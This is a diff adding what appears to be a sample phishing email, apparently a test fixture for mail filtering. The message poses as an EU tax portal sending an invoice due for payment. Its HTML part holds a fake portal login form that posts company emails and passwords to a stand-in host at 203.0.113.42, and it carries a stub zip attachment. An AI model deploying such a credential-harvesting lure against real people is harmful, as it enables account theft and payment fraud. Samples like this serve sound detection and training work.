@@ -1,0 +1,46 @@
+Return-Path: <invoices@euro-tax-portal.biz>
+Delivered-To: accounting@examplecorp.com
+Received: from vps99.euro-tax-portal.biz ([203.0.113.42])
+	by mailgate.examplecorp.com with ESMTPS id q1w2e3
+	Wed, 02 Sep 2026 10:31:00 +0000
+Authentication-Results: mailgate.examplecorp.com; spf=fail (domain of euro-tax-portal.biz does not designate 203.0.113.42) smtp.mailfrom=euro-tax-portal.biz; dkim=none; dmarc=fail (p=none)
+From: "EU Tax Portal" <invoices@euro-tax-portal.biz>
+To: accounting@examplecorp.com
+Subject: Invoice INV-2026-0842 attached - payment due
+Date: Wed, 02 Sep 2026 10:29:44 +0000
+Message-ID: <>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY_HARV"
+
+--BOUNDARY_HARV
+Content-Type: text/plain; charset=utf-8
+
+Dear Sir/Madam,
+
+Please find attached the outstanding invoice INV-2026-0842.
+Kindly process payment before the due date.
+
+To view your invoice online, visit: http://203.0.113.42:8080/invoice/view
+
+Finance Department
+--BOUNDARY_HARV
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>Dear Sir/Madam,</p>
+<p>Please find attached the outstanding invoice <b>INV-2026-0842</b>.
+Kindly process payment before the due date.</p>
+<form action="http://203.0.113.42:8080/login" method="POST">
+<p>Portal login to view your invoice:</p>
+<input type="text" name="user" placeholder="Company email">
+<input type="password" name="pass" placeholder="Portal password">
+<input type="submit" value="View invoice">
+</form>
+<p>Finance Department</p>
+</body></html>
+--BOUNDARY_HARV
+Content-Type: application/zip; name="INV-2026-0842.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2026-0842.zip"
+
+UEsDBBQAAAgIAHJ1pFQAAAAAAAAAAAAAAAAKACwAQQBDAEYAMgAwADIAdABhAGwALgB0AHgAdAA=
